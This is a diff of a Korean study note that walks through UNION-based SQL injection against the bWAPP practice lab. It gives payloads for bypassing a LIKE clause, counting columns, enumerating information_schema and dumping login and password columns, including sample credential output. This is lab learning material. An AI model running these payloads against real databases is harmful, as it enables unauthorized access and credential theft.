@@ -7,18 +7,6 @@ notion_source: "https://app.notion.com/p/sql-ingection-bWAPP-test-40faa16a5aa480
 ---
 0' union select 1,table_schema,column_name,4,5,6 from information_schema.columns where table_schema='bWAPP' and table_name='cisco' #
 
-SELECT * FROM movies WHERE title LIKE '%' OR 1=1 -- %';
-
-SELECT * FROM movies WHERE title LIKE '%' OR 1=1';
-
-%가 앞에 붙으면 해당 문자열로 끝나는 문자를 매칭시키는거고
-%가 뒤에 붙으면 해당 문자열로 시작하는 문자들이 매칭된다.
-
-LIKE 검색 알고리즘은 추후에 알아본다.
-
-LIKE %I ---> I로 끝나는 문자 매칭
-LIKE I% ---> I로 시작하는 문자 매칭
-LIKE %I% ----> I가 들어간 모든 문자 매칭
 
 ```sql
 SELECT * FROM movies 
@@ -48,17 +36,30 @@ AND TABLE_NAME='cisco;
 
 ' #%';
 
-- - 가 뒤의 %';를 주석으로 만들어 정상적인 SQL이 된다.
+- - 가 뒤의 %';를 주석으로 만들어 정상적인 SQL이 된다. 
 입력	뒤에 남는 코드 처리	결과
 ' OR 1=1	%';가 그대로 남음	문법 오류
 ' OR 1=1 --	%';가 주석 처리됨	실행 가능
 
+
+SELECT * FROM movies WHERE title LIKE '%' OR 1=1 -- %';
+
+SELECT * FROM movies WHERE title LIKE '%' OR 1=1';
+
+%가 앞에 붙으면 해당 문자열로 끝나는 문자를 매칭시키는거고
+%가 뒤에 붙으면 해당 문자열로 시작하는 문자들이 매칭된다.
+
+LIKE 검색 알고리즘은 추후에 알아본다.
+
+LIKE %I ---> I로 끝나는 문자 매칭
+LIKE I% ---> I로 시작하는 문자 매칭
+LIKE %I% ----> I가 들어간 모든 문자 매칭
+
 sql 원형
 
-```plain text
+```sql
 SELECT * FROM movies WHERE title LIKE '%입력값%';
 ```
-
 실제 완성되는 구문
 
 ```sql
@@ -77,19 +78,18 @@ FROM testdb.cisco; #%'
 
 sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이블의 컬럼 갯수와 맞아야 한다. union은 **두 조회 결과를 하나의 표로 합치기 때문이다. **SELECT 뒤의 값 개수를 늘려가며 오류가 사라지는지 확인한다.
 
-```plain text
+```sql
 ' UNION SELECT 1 #
+' UNION SELECT 1,2 #
+' UNION SELECT 1,2,3... #
 ```
 
-```plain text
-' UNION SELECT 1,2 #
-```
 
 ![Notion 이미지 1]({{ '/assets/images/posts/2026-11-05-sql-ingection-bwapp-test/01-40faa16a.png' | relative_url }})
 
 같은 방식으로 늘리면, 현재 movies에서는 **7개일 때 컬럼 수가 맞다.**
 
-```plain text
+```sql
 ' AND 1=0 UNION SELECT 1,2,3,4,5,6,7 #
 ```
 
@@ -107,13 +107,11 @@ sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이�
 
 현재 계정에서 볼 수 있는 DB 목록을 확인할 수 있다. 
 
-```plain text
+```sql
 'AND 1=0 UNION SELECT 1,SCHEMA_NAME,NULL,NULL,NULL,NULL,NULL FROM information_schema.SCHEMATA #
 ```
 
 | information_schema |  |  |  | [**Link**](https://www.imdb.com/title/) |
-
-| --- | --- | --- | --- | --- |
 
 | bWAPP |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
@@ -125,8 +123,8 @@ sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이�
 
 **`information_schema`****는 MySQL의 데이터베이스·테이블·컬럼·권한 같은 구조 정보를 조회하는 메타데이터용 데이터베이스**
 
-영화 제목이나 사용자 비밀번호 같은 실제 데이터보다는 **“어떤 테이블에 어떤 컬럼이 있는가”**를 알려줍니다.
-
+영화 제목이나 사용자 비밀번호 같은 실제 데이터보다는 **“어떤 테이블에 어떤 컬럼이 있는가”**를 알려준다.
+```
 | 주요 테이블 | 담긴 정보 | 주요 컬럼 |
 
 | --- | --- | --- |
@@ -173,16 +171,17 @@ sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이�
 \| VIEWS                                               \|
 +---------------------------------------+
 17 rows in set (0.00 sec)
+```
+
+
 
 **3. testdb의 테이블을 활용해서 information_schema테이블에 union 해서 정보 확인**
 
-```plain text
+```sql
 ' UNION SELECT 1,TABLE_NAME,NULL,NULL,NULL,NULL,NULL FROM information_schema.TABLES WHERE TABLE_SCHEMA='testdb' #
 ```
 
 | cisco |  |  |  | [**Link**](https://www.imdb.com/title/) |
-
-| --- | --- | --- | --- | --- |
 
 | linux |  |  |  | [**Link**](https://www.imdb.com/title/) |
 
@@ -190,7 +189,7 @@ sql ingection은 기본적으로 union을 활용하기 때문에 기준 테이�
 
 3.5 cisco 테이블의 구조를 information_schema 테이블에 저장된 schema (데이터베이스 목록). columns를 조회
 
-```javascript
+```sql
 0' union select 1,table_schema,column_name,4,5,6 from information_schema.columns where table_schema='bWAPP' and table_name='cisco' #
 
 ```
@@ -201,19 +200,19 @@ table_schema는 데이터베이스 정보 목록. testdb를 선택하고, table_
 
 cisco
 
-```plain text
+```sql
 'AND 1=0 UNION SELECT 1,TABLE_NAME,COLUMN_NAME,DATA_TYPE,NULL,NULL,ORDINAL_POSITION FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='testdb' AND TABLE_NAME='cisco' #
 ```
 
 linux:
 
-```plain text
+```sql
 'AND 1=0 UNION SELECT 1,TABLE_NAME,COLUMN_NAME,DATA_TYPE,NULL,NULL,ORDINAL_POSITION FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='testdb' AND TABLE_NAME='linux' #
 ```
 
 security
 
-```plain text
+```sql
 'AND 1=0 UNION SELECT 1,TABLE_NAME,COLUMN_NAME,DATA_TYPE,NULL,NULL,ORDINAL_POSITION FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='testdb' AND TABLE_NAME='security' #
 ```
 
@@ -222,8 +221,6 @@ security
 linux 테이블 컬럼 구조 
 
 | linux | id |  | int | [**Link**](https://www.imdb.com/title/) |
-
-| --- | --- | --- | --- | --- |
 
 | linux | login |  | varchar | [**Link**](https://www.imdb.com/title/) |
 
@@ -236,8 +233,6 @@ linux 테이블 컬럼 구조
 cisco 테이블 컬럼 구조 
 
 | **Title** | **Release** | **Character** | **Genre** | **IMDb** |
-
-| --- | --- | --- | --- | --- |
 
 | cisco | id |  | int | [**Link**](https://www.imdb.com/title/) |
 
@@ -253,8 +248,6 @@ security 테이블 컬럼 구조
 
 | **Title** | **Release** | **Character** | **Genre** | **IMDb** |
 
-| --- | --- | --- | --- | --- |
-
 | security | id |  | int | [**Link**](https://www.imdb.com/title/) |
 
 | security | login |  | varchar | [**Link**](https://www.imdb.com/title/) |
@@ -269,23 +262,21 @@ security 테이블 컬럼 구조
 
 **의 영화 조회 조건을 거짓으로 만들면 ****`cisco`**** 데이터만 출력된다** bWAPP 입력창에 넣으세요.
 
-- `AND 1=0` : 원래 `movies` 조회 결과를 0행으로 만듭니다.
+- `AND 1=0` : 원래 `movies` 조회 결과를 0행으로 만든다.
 
 - `UNION ALL SELECT ...` : `cisco`의 행을 추가합니다.
 
 - `#` : 원래 SQL의 남은 부분을 주석 처리합니다.
 
-현재 화면 기준으로는 다음 위치에 표시됩니다.
+현재 화면 기준으로는 다음 위치에 표시된다.
 
 cisco는 실제로 확인한 login, password, username을 사용한다.
 
-```plain text
+```sql
 ' AND 1=0 UNION ALL SELECT 1,login,password,username,NULL,NULL,NULL FROM testdb.cisco #
 ```
 
 | **Title** | **Release** | **Character** | **Genre** | **IMDb** |
-
-| --- | --- | --- | --- | --- |
 
 | cisco1 | cisco1111 |  | kim jung woo | [**Link**](https://www.imdb.com/title/) |
 
@@ -295,13 +286,11 @@ cisco는 실제로 확인한 login, password, username을 사용한다.
 
 linux
 
-```plain text
+```sql
 ' AND 1=0 UNION ALL SELECT 1,login,password,username,NULL,NULL,NULL FROM testdb.linux #
 ```
 
 | **Title** | **Release** | **Character** | **Genre** | **IMDb** |
-
-| --- | --- | --- | --- | --- |
 
 | linux1 | 1fee615b09949f90b702519072e45afa |  | lee jung woo | [**Link**](https://www.imdb.com/title/) |
 
@@ -337,7 +326,7 @@ linux
 
 - security 계정 
 
-```plain text
+```sql
 ' AND 1=0 UNION ALL SELECT 1,login,password,username,NULL,NULL,NULL FROM testdb.security #
 ```
 
